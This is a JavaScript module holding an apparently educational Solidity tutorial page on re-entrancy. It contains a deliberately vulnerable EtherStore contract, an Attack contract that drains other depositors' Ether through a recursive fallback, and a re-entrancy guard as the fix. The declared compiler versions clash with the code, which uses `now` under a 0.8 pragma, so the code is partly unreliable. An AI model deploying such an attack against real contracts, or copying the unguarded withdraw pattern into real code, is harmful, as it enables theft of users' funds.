// metadata
export const version = "0.6.10"
export const title = "Re-Entrancy"
export const description = "An example of re-entrancy attack in Solidity"

const html = `<h3 id="vulnerability">Vulnerability</h3>
<p>Let&#39;s say that contract <code>A</code> calls contract <code>B</code>.</p>
<p>Reentracy exploit allows <code>B</code> to call back into <code>A</code> before <code>A</code> finishes execution.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.0;</span>

<span class="hljs-comment">/*
EtherStore is a contract where you can deposit any amount and withdraw at most
1 Ether per week. This contract is vulnerable to re-entrancy attack.
Let&#x27;s see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherStore</span> </span>{
    <span class="hljs-comment">// Withdrawal limit = 1 ether / week</span>
    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">constant</span> <span class="hljs-keyword">public</span> WITHDRAWAL_LIMIT = <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> lastWithdrawTime;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> =&gt; <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> balances;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-built_in">require</span>(balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] &gt;= _amount);
        <span class="hljs-built_in">require</span>(_amount &lt;= WITHDRAWAL_LIMIT);
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">now</span> &gt;= lastWithdrawTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] + <span class="hljs-number">1</span> <span class="hljs-literal">weeks</span>);

        (<span class="hljs-keyword">bool</span> sent, ) = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: _amount}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);

        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] -= _amount;
        lastWithdrawTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-built_in">now</span>;
    }

    <span class="hljs-comment">// Helper function to check the balance of this contract</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    EtherStore <span class="hljs-keyword">public</span> etherStore;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _etherStoreAddress</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        etherStore = EtherStore(_etherStoreAddress);
    }

    <span class="hljs-comment">// Fallback is called when EtherStore sends Ether to this contract.</span>
    <span class="hljs-keyword">fallback</span>() <span class="hljs-keyword">external</span> <span class="hljs-keyword">payable</span> {
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">address</span>(etherStore).<span class="hljs-built_in">balance</span> &gt;= <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>) {
            etherStore.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> &gt;= <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
        etherStore.deposit{<span class="hljs-built_in">value:</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}();
        etherStore.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
    }

    <span class="hljs-comment">// Helper function to check the balance of this contract</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
    }
}
</code></pre>
<h3 id="preventative-techniques">Preventative Techniques</h3>
<ul>
<li>Ensure all state changes happen before calling external contracts</li>
<li>Use function modifiers that prevent re-entrancy</li>
</ul>
<p>Here is a example of a re-entracy guard</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.0;</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">ReEntrancyGuard</span> </span>{
    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">internal</span> locked;

    <span class="hljs-function"><span class="hljs-keyword">modifier</span> <span class="hljs-title">noReentrant</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-built_in">require</span>(!locked, <span class="hljs-string">"No re-entrancy"</span>);
        locked = <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">_</span>;
        locked = <span class="hljs-literal">false</span>;
    }
}</code></pre>
`

export default html
